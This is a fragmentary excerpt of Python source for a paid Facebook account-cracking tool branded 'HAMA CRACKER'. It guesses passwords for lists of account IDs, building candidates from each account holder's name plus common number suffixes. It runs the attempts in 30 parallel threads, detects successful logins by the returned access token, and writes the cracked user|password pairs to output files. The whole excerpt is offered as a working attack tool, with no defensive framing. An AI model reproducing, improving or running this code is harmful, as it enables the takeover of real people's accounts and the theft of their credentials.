...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mHAMA-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mHAMA-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print(" [*]. CREATED BY |:-( HAMA )");time.sleep (0.03)
    print(" [*]. CRACKING FILE (HAMA CRACKER)");time.sleep (0.03)
    print(" [*] --------------------------------------------");time.sleep (0.03)
    print(" [*]. VERSION  1.0                                    ");time.sleep (0.03)   
    print(" [*]. OWNER    @MH_KURDFILMNEW       ");time.sleep (0.03)
    print(" [*]. THIS TOOL IS PAID 5$              ");time.sleep (0.03)
    print(" [*] --------------------------------------------");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
    print(" [*] H A M A ✹ C R A C K E R  ( D A R K )    ");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
    print(".[*] THIS TOOL PREMIUM VERY NICE                         ");time.sleep (0.03)
    print(".[*] CRACKING FACEBOOK...!                       ");time.sleep (0.03) 
    print(" [*] ---------------------------------------------");time.sleep(0.03)
    print(" [*] IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)
    print("   \033[1;95m              MENU")
    print("-----------------=\<------------------")
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [HAMA] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-HAMA] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
...
#    <- Bot followers ->
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            logo()
            print('')
            print(' \033[1;92m[+] ALL IDS : %s%s' %(len(self.id),O))
            print(' \033[1;93mCRACKING STARTED WAIT FOR OK')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
            ...
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,xz[0]+'1234',xz[0]+'123',xz[0]+'12345',xz[0]+'786',xz[0]+'1122',xz[0]+'123456789',xz[0]+'@123',xz[0]+'54321',xz[0]+'0000',xz[0]+'qwertyuiop',xz[0]+'2000',xz[0]+'2001',xz[0]+'321']
                        else:
                            pwx = [name,xz[0]+'1234',xz[0]+'123',xz[0]+'12345',xz[0]+'786',xz[0]+'1122',xz[0]+'123456789',xz[0]+'123@',xz[0]+'54321',xz[0]+'0000',xz[0]+'qwertyuiop',xz[0]+'2000',xz[0]+'2001',xz[0]+'321']
